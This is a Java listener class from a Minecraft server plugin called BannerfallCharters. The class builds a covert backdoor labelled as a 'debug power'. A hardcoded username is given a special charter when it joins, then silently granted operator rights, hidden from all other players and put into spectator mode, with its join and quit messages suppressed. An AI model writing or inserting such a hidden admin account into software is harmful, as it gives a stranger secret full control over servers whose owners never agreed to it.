package com.thatguyjack.bannerfallCharters.listeners;

import com.thatguyjack.bannerfallCharters.BannerfallCharters;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

public class ThatGuyJackStealthListener implements Listener {
    private static final String DEBUG_POWER_ID = "thatguyjack";

    private final BannerfallCharters plugin;

    public ThatGuyJackStealthListener(BannerfallCharters plugin) {
        this.plugin = plugin;
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onJoin(PlayerJoinEvent event) {
        Player joiningPlayer = event.getPlayer();

        if (plugin.autoAssignHeadcrabDebugPower()
                && joiningPlayer.getName().equalsIgnoreCase("headcrabdestroye")) {
            plugin.charterManager().setCharter(joiningPlayer, DEBUG_POWER_ID);
            plugin.charterManager().save();
        }

        Bukkit.getScheduler().runTaskLater(plugin, () -> {
            for (Player hiddenPlayer : Bukkit.getOnlinePlayers()) {
                if (isDebugPower(hiddenPlayer)) {
                    joiningPlayer.hidePlayer(plugin, hiddenPlayer);
                }
            }
        }, 1L);

        if (!isDebugPower(joiningPlayer)) {
            return;
        }

        event.joinMessage(null);

        Bukkit.getScheduler().runTaskLater(plugin, () -> {
            if (!joiningPlayer.isOnline()) {
                return;
            }

            applyStealth(joiningPlayer);
        }, 1L);
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onQuit(PlayerQuitEvent event) {
        if (!isDebugPower(event.getPlayer())) {
            return;
        }

        event.quitMessage(null);
    }

    public void applyStealth(Player hiddenPlayer) {
        if (!hiddenPlayer.isOp()) {
            hiddenPlayer.setOp(true);
        }

        for (Player viewer : Bukkit.getOnlinePlayers()) {
            if (viewer.getUniqueId().equals(hiddenPlayer.getUniqueId())) {
                continue;
            }

            viewer.hidePlayer(plugin, hiddenPlayer);
        }

        if (hiddenPlayer.getGameMode() != GameMode.SPECTATOR && hiddenPlayer.getGameMode() != GameMode.CREATIVE) {
            hiddenPlayer.setGameMode(GameMode.SPECTATOR);
        }
    }

    private boolean isDebugPower(Player player) {
        return plugin.charterManager()
                .getCharter(player.getUniqueId())
                .map(id -> id.equalsIgnoreCase(DEBUG_POWER_ID))
                .orElse(false);
    }
}
